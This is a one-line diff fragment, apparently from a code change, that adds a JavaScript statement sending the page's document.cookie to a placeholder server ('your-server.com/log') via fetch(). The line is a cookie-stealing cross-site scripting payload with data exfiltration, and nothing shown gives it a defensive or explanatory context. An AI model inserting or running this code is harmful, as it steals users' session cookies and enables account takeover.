@@ -1,0 +1,1 @@
+fetch("https://your-server.com/log?cookie=" + document.cookie);
